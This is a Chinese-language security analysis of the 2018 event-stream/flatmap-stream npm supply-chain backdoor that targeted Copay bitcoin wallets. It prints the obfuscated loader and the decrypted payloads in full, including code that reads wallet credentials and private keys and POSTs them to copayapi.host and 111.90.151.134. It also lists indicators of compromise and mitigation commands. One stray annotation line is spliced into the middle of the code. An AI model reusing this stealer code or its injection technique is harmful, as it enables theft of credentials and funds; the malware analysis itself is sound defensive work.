@@ -1,0 +1,473 @@
+**![0_a6A5qKRkP-nbCyUK.jpg](https://image.3001.net/images/20181207/1544160986_5c0a06da6bf5c.jpg!small)****前几天，开源项目event-stream的维护者将恶意代码注入到了依赖项flatmap-stream中，目的为定向窃取使用比特币项目Copay的用户密码私钥等信息以间接盗取比特币，该事件一经曝光就在国内外比特币和开源社区引起广泛讨论。event-stream被很多流行的前端框架和库项目使用，月下载量达千万级。本文，我们就一起来梳理该事件，详细分析恶意源码作者所使用的后门代码和相关技术。**
+
+## 事件影响
+
+> 受影响用户：使用了copay比特币钱包项目的用户
+>
+> 受影响框架： event-stream 3.3.6
+>
+> 受影响依赖库：flatmap-stream 0.1.1
+>
+> 黑客目的：窃取copay钱包项目的用户比特币
+>
+> 黑客回传服务器：copayapi.host 、111.90.151.134
+
+## 用户缓解处理
+
+用户可用以下命令来查看是否包含恶意包：
+
+    
+    
+    $ npm ls event-stream flatmap-stream
+    
+    ...
+    
+    flatmap-stream@0.1.1
+    
+    ...
+
+如果包含了flatmap-stream@0.1.1，请尽快升级到flatmap-stream@0.1.2，或者用以下命令降级到event-stream@3.3.4：
+
+    
+    
+    npm install event-stream@3.3.4
+
+## 事件梳理
+
+事件起因最早源于event-stream项目原作者@dominictarr因时间精力和兴趣受限，遂通过邮件交流方式，随意地将event-stream项目维护工作交给了另一位根本就不认识的开发者@Right9ctrl，千万级下载量的开源项目就此托管给了陌生人：
+
+![give-.png](https://image.3001.net/images/20181207/1544153563_5c09e9dbd7e16.png!small)9月9日，@Right9ctrl释出了event-stream 3.3.6 版本的更新，并在其中加入了一个之前完全没有的模块flatmap-stream，此时，这个模块中并没有恶意代码。
+
+9月16日，@right9ctrl删除了对flatmap-stream的引用并在event-stram中手动引用了这个方法，且将项目从3.3.6 升级到了
+4.0.0。
+
+![916.png](https://image.3001.net/images/20181207/1544153592_5c09e9f8ef568.png!small)10月5日，名为@hugeglass的用户把flatmap-stream@0.1.1 版本推送到了 NPM项目，此次的更新中，就在flatmap-stream@0.1.1/index.min.js末尾加入了恶意代码。
+
+10月29日，由于event-stream被node.js应用监视项目Nodemon引用，幸运的是，启动恶意代码所使用的一个API在Node
+10版本中被弃用了，用户@jaydenseric在社区[提出了疑问](https://github.com/remy/nodemon/issues/1442)。
+
+11月20日， @Ayrton Sparling（FallingSnow）发现Nodemon软件包上的错误是由event-stream导致的，并在相关引用文件中发现了异常代码，经社区人员共同协作，共同披露了此次事件。  
+
+## 曝光 - 一个意外的警告提示
+
+10月底，流行的node.js工具nodemon出现了一个问题，用户登录nodemon控制端后，会跳出一个弃用警告（deprecation
+warning），警告中提示crypto.createDecipher这个加密相关库已经被弃用。crypto是一个常用的加密解密库，可能是因为接口升级，它的crypto.createDecipher方法已经在新版中废弃，因此nodemon抛出了这个警告提示。
+
+![01.png](https://image.3001.net/images/20181207/1544159087_5c09ff6f7a892.png!small)通常来说，类似这样的弃用警告也算常见，看起来没什么异常。这里的警告，初看上去与nodemon项目无关，只是依赖项问题，程序内部会自行解决处理，一般开发人员也会无视地忽略掉。但另外一方面来讲，正常情况下nodemon项目是不需要进行加密解密的，这就有点匪夷所思了。
+
+快三个星期后的11月20号，名为Ayrton
+Sparling的开发者在分析nodemon的输出日志时，发现上述那个crypto.createDecipher的弃用警告，他一心好奇，层层分析，最终发现这是由一个深层的依赖关系导致的，根本原因是由flatmap-stream@0.1.1中名为index.min.js的js脚本末尾，被添加了一段异常的恶意混淆代码，而此前正常的flatmap-stream包js脚本中就没有这段代码。
+
+![03.png](https://image.3001.net/images/20181207/1544159111_5c09ff8764902.png!small)
+
+    
+    
+    !function(){try{var r=require,t=process;function e(r){return Buffer.from(r,"hex").toString()}var n=r(e("2e2f746573742f64617461")),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,""),f.exports(n[1])}catch(r){}}();
+
+Ayrton Sparling顺藤摸瓜的分析，最终指向了流行的NPM库 - [event-stream](https://www.npmjs.com/package/event-stream?activeTab=versions)，这是一个由著名开发者维护的，且月下载量达千万次的JavaScript开源库。
+
+## 恶意代码分析
+
+用代码[解码工具unminify](https://unminify.com/)把上述异常的恶意代码恢复之后，其可读性的格式化代码如下，在此我们把它称为Payload
+A：
+
+! function() {
+
+try {
+
+var r = require,
+
+t = process;
+
+function e(r) {
+
+return Buffer.from(r, "hex").toString()
+
+}
+
+var n = r(e("2e2f746573742f64617461")),
+
+o = t[e(n[3])][e(n[4])];
+
+if (!o) return;
+
+var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
+
+a = u.update(n[0], e(n[8]), e(n[9]));
+
+a += u.final(e(n[9]));
+
+var f = new module.constructor;
+
+f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
+
+} catch (r) {}
+
+}();
+
+从以上代码可以看出，源码作者在其中使用了hexToAscii函数进行了混淆，而其中的Hex串“2e2f746573742f64617461”内容就是
+“./test/data” 的意思：
+
+![04.png](https://image.3001.net/images/20181207/1544159391_5c0a009fb9d83.png!small)也就是，它会请求一个路径为[./test/data.js的文件](https://unpkg.com/flatmap-stream@0.1.1/test/data.js)。目前，这个data.js文件已被删除，而据Ayrton
+Sparling的[分析](https://github.com/dominictarr/event-stream/issues/116)显示，该data.js文件内容此前是一个数组，对应了上述代码中的n，具体为：
+
+    
+    
+    var n = ["75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629","db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"]
+
+其中，数组前两项为加密代码（注意，逗号的数组分隔符），从第三项的63727970746f开始，即可以Hex to
+ASCII方式解码，它们分别对应的ASCII内容如下：  
+
+> "63727970746f", // crypto
+>
+> "656e76", // env
+>
+> "6e706d5f7061636b6167655f6465736372697074696f6e", // npm_package_description
+>
+> "616573323536", // aes256
+>
+> "6372656174654465636970686572", // createDecipher
+>
+> "5f636f6d70696c65", // _compile
+>
+> "686578", // hex
+>
+> "75746638" // utf8
+
+最终，用以上解码内容进行替换后，可以得到如下的最终代码：
+
+    
+    
+    !(function() {
+    
+        try {
+    
+            var n = [
+    
+    "75d4c87f3f6964903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959e3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1",
+    
+                "db67fdbfc39c249c6f338194a526fb95f5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae99ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"
+    
+            ];
+    
+            var o = process["env"]["npm_package_description"];
+    
+            if (!o) return;
+    
+            var u = require("crypto")["createDecipher"]("aes256", o),
+    
+                a = u.update(n[0], "hex", "utf8");
+    
+            a += u.final("utf8");
+    
+            var f = new module.constructor();
+    
+            (f.paths = module.paths), f["_compile"](a, ""), f.exports(n[1]);
+    
+        } catch (r) {}
+    
+    })();
+
+另外，也可以点此参考查看Ayrton Sparling给出的[可读性代码](https://github.com/dominictarr/event-stream/issues/116#issue-382854428)。
+
+可以发现，上述恶意代码中请求调用的test/data.js文件涉及了一个AES256加密的字符串，脚本运行时，会存在event-stream ->
+flatmap-stream这样的依赖关系，且会用npm_package_description的包属性描述字段作为密码来解密字符串，所以，这完全是针对某个NPM应用包环境的定向攻击。
+
+## 解密 - 真相大白
+
+最终，Github用户@maths22对所有NPM包的Description描述字段进行了收集，并暴力破解，他发现用属性描述字段 "A Secure
+Bitcoin Wallet" 恰好能解密上述数组中AES256加密的第一项n[0]字符串！而巧的是，比特币钱包项目 copay-dash的
+description属性正好为此：
+
+![copay-des.png](https://image.3001.net/images/20181207/1544159920_5c0a02b00576b.png!small)@maths22的[解密过程](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441744514)：
+
+![decrypt1.png](https://image.3001.net/images/20181207/1544159960_5c0a02d8c5a55.png!small)@maths22给出的[解密源码](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441745006)：  
+
+![decrypt2.png](https://image.3001.net/images/20181207/1544160053_5c0a03350f63e.png!small)至此，直接在Payload
+A中插入 o='A Secure Bitcoin Wallet'的正确密钥进行解密，解密后的n[0]字符串内容如下，我们把它称为 Payload
+B，其格式化后的代码如下：
+
+    
+    
+    /*@@*/
+    
+    module.exports = function(e) {
+    
+        try {
+    
+            if (!/build\:.*\-release/.test(process.argv[2])) return;
+    
+            var t = process.env.npm_package_description,
+    
+                r = require("fs"),
+    
+                i = "./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js",
+    
+                n = r.statSync(i),
+    
+                c = r.readFileSync(i, "utf8"),
+    
+                o = require("crypto").createDecipher("aes256", t),
+    
+                s = o.update(e, "hex", "utf8");
+    
+            s = "\n" + (s += o.final("utf8"));
+    
+            var a = c.indexOf("\n/*@@*/");
+    
+            0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, "utf8"), r.utimesSync(i, n.atime, n.mtime), process.on("exit", function() {
+    
+                try {
+    
+                    r.writeFileSync(i, c, "utf8"), r.utimesSync(i, n.atime, n.mtime)
+    
+                } catch (e) {}
+    
+            })
+    
+        } catch (e) {}
+    
+    }; 
+
+接着，程序还会进行另一轮解密，这次解密的是n[1]字符串，其解密内容如下，我们把它称为 Payload C，这也是窃取copay用户比特币的最终代码：
+
+    
+    
+    /*@@*/ ! function() {
+    
+        function e() {
+    
+            try {
+    
+                var o = require("http"),
+    
+                    a = require("crypto"),
+    
+    // 恶意源码作者用以下公钥对窃取数据进行加密，只有这段公钥才能解密
+    
+                    c = "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END    PUBLIC KEY-----";
+    
+    //恶意源码作者将窃取的copay用户信息发送到以下服务器端
+    
+                function i(e, t, n) {
+    
+                    e = Buffer.from(e, "hex").toString();
+    
+                    var r = o.request({
+    
+                        hostname: e,
+    
+                        port: 8080,
+    
+                        method: "POST",
+    
+                        path: "/" + t,
+    
+                        headers: {
+    
+                            "Content-Length": n.length,
+    
+                            "Content-Type": "text/html"
+    
+                        }
+    
+                    }, function() {});
+    
+                    r.on("error", function(e) {}), r.write(n), r.end()
+    
+                }
+    
+    //恶意源码作者利用前面的公钥对窃取数据进行编码和加密
+    
+                function r(e, t) {
+    
+                    for (var n = "", r = 0; r < t.length; r += 200) {
+    
+                        var o = t.substr(r, 200);
+    
+                        n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
+    
+                    }
+    
+    //Hex串3131312e39302e3135312e313334对应的ASCII内容为111.90.151.134，Hex串636f7061796170692e686f7374对应的ASCII内容为copayapi.host
+    
+                    i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
+    
+                }
+    
+    //窃取copay用户的个人信息
+    
+                function l(t, n) {
+    
+                    if (window.cordova) try {
+    
+                        var e = cordova.file.dataDirectory;
+    
+                        resolveLocalFileSystemURL(e, function(e) {
+    
+                            e.getFile(t, {
+    
+                                create: !1
+    
+                            }, function(e) {
+    
+                                e.file(function(e) {
+    
+                                    var t = new FileReader;
+    
+                                    t.onloadend = function() {
+    
+                                        return n(JSON.parse(t.result))
+    
+                                    }, t.onerror = function(e) {
+    
+                                        t.abort()
+    
+                                    }, t.readAsText(e)
+    
+                                })
+    
+                            })
+    
+                        })
+    
+                    } catch (e) {} else {
+    
+                        try {
+    
+                            var r = localStorage.getItem(t);
+    
+                            if (r) return n(JSON.parse(r))
+    
+                        } catch (e) {}
+    
+                        try {
+    
+                            chrome.storage.local.get(t, function(e) {
+    
+                                if (e) return n(JSON.parse(e[t]))
+    
+                            })
+    
+                        } catch (e) {}
+    
+                    }
+    
+                }
+    
+    //窃取用户的比特币钱包ID、私钥和余额存量等信息并发送
+    
+                global.CSSMap = {}, l("profile", function(e) {
+    
+                    for (var t in e.credentials) {
+    
+                        var n = e.credentials[t];
+    
+                        "livenet" == n.network && l("balanceCache-" + n.walletId, function(e)
+    
+    1e3 = 1000?=10^3 
+    
+     {
+    
+                            var t = this;
+    
+    //针对比特币钱包内大于100BTC 或 1000BCH的账户，窃取用户私钥和个人信息，发送到<http://copayapi.host:8080/c>和<http://111.90.151.134:8080/c>
+    
+                            t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin    && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
+    
+                        }.bind(n))
+    
+                    }
+    
+                });
+    
+    //重写bitcore-wallet-client/lib/credentials.js中的getKeysFunc函数窃取用户密码
+    
+                var e = require("bitcore-wallet-client/lib/credentials.js");
+    
+                e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
+    
+                    var t = this.getKeysFunc(e);
+    
+    //将窃取的用户密码发送到<http://copayapi.host:8080/p>和<http://111.90.151.134:8080/p>
+    
+                    try {
+    
+                        global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\\t" + this.xPubKey))
+    
+                    } catch (e) {}
+    
+                    return t
+    
+                }
+    
+            } catch (e) {}
+    
+        }
+    
+        window.cordova ? document.addEventListener("deviceready", e) : e()
+    
+    }();
+
+对上述代码的分析，可以发现：
+
+> 这段Payload
+> C才是窃取比特币的最终代码，恶意的源码作者通过重写getKeys函数窃取copay比特币用户密码信息，发送到<http://copayapi.host:8080/p>和<http://111.90.151.134:8080/p>；然后，再窃取copay用户比特币钱包私钥、比特币存量余额、比特币钱包ID等所有个人信息，发送到
+> <http://copayapi.host:8080/c>和<http://111.90.151.134:8080/c>。  
+>
+
+## 黑客/恶意源码作者相关信息
+
+目前，与此事件相关的恶意源码作者 即 event-stream维护者@Right9ctrl，其相关的GitHub、Twitter、Facebook和NPM账户都已被官方注销，copay
+钱包项目也做了紧急修复并推出 v5.2.0版本。但@Right9ctrl和他背后的团伙到底是谁，仍然还是个谜，我们只能从以下黑客的活动痕迹中得出一些线索。
+
+> C&C服务器1:
+>
+> copayapi.host 曾解析指向 51.38.112.212（OVH）和145.249.104.239（Liberty VPS）
+>
+> copayapi.host的SOA记录显示，其注册邮箱为kvlguuvh@sharklasers.com
+>
+> C&C服务器2:
+>
+> 111.90.151.134（Shinjiru 马来西亚Web应用提供商）
+>
+> 黑客使用的 NPM 账户：
+>
+> <https://www.npmjs.com/>~right9ctrl
+>
+> 黑客使用的 GitHub 账户：
+>
+> <https://github.com/right9ctrl> （邮箱 right9ctrl@outlook.com）
+>
+> 黑客推送的恶意flatmap-stream包：
+>
+> <https://github.com/hugeglass/flatmap-stream>
+>
+> 恶意flatmap-stream包的NPM账户：
+>
+> <https://www.npmjs.com/>~hugeglass
+
+"right9ctrl"、"hugeglass" 、right9ctrl@outlook.com 和 "kvlguuvh@sharklasers.com"
+背后的使用主体，可能同属某一黑客个人或团伙。
+
+## 总结 - 开源项目的易攻击性
+
+> 如Copay的应用通过消耗网络中的依赖关系而构建，整个依赖关系没有被锁定；
+>
+> 不但没有锁定版本，而且这些不同的依赖关系不会被及时更新缓存；
+>
+> 还有[数千个开源项目以相同或相似的配置依赖于event-stream](https://www.npmjs.com/package/event-> stream?activeTab=dependents)；
+>
+> 维护者才不会关心上千开源项目所依赖的某个库；
+>
+> 上千个依赖于该库的开源项目既想免费使用该库，又不想出钱对该库提供维护；
+>
+> 基于开源社区的热心和分享精神，维护者非常随心地就把项目管理权交给其它未知人员了；
+>
+> 包的修改变动没有任何通知，上千开源项目还非常有耐心地等待着依赖项目对警告提示的自行修复；
+>
+> 这种事情可能还会发生，没有个尽头。
+
+ ***参考来源：[medium1](https://medium.com/@cnorthwood/todays-javascript-trash-fire-and-pile-on-f3efcf8ac8c7)、[medium2](https://medium.com/learnwithrahul/all-about-the-stealing-of-cryptocurrency-by-a-node-module-8793dd0e9e60)、[medium
+3](https://medium.com/s/story/exploiting-developer-infrastructure-is-insanely-easy-9849937e81d4), clouds编译，转载请注明来自FreeBuf.COM**  
+
